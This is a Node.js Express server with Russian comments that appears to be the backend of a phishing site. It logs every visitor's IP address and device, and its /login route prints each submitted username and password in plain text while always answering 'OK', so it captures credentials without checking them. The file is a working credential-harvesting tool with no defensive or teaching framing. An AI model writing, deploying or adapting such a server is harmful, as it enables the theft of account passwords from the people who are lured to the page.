const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');

app.disable('x-powered-by');
app.set('trust proxy', true);

// Позволяем серверу читать JSON из запросов
app.use(express.json());

// 🌐 ЛОГГЕР ПОСЕЩЕНИЙ
app.use((req, res, next) => {
    if (req.method === 'GET' && (req.path === '/' || req.path === '/index.html')) {
        const ip = req.ip || req.connection.remoteAddress;
        const userAgent = req.headers['user-agent'] || 'Неизвестное устройство';
        const time = new Date().toLocaleString('ru-RU');
        
        console.log('\n====================================');
        console.log(`🌐 НОВЫЙ ПОСЕТИТЕЛЬ ЗАШЕЛ НА САЙТ!`);
        console.log(`📍 IP: ${ip}`);
        console.log(`💻 Устройство: ${userAgent}`);
        console.log(`⏰ Время: ${time}`);
        console.log('====================================\n');
    }
    next();
});

// 🔥 ОБРАБОТКА ЛОГИНОВ И ПАРОЛЕЙ
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    console.log('\n====================================');
    console.log(`🔥 НОВЫЙ ЛОГИН!`);
    console.log(`👤 Юзер: ${username}`);
    console.log(`🔑 Пароль: ${password}`);
    console.log(`⏰ Время: ${new Date().toLocaleString('ru-RU')}`);
    console.log('====================================\n');

    res.status(200).send('OK');
});

// Фикс MIME-типа для картинки фона (чтобы браузер не тупил)
app.get('/bg.jpg', (req, res, next) => {
    res.type('png');
    const stream = fs.createReadStream(path.join(__dirname, 'bg.jpg'));
    stream.on('error', next);
    stream.pipe(res);
});

// Раздаем статические файлы
app.use(express.static(__dirname));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
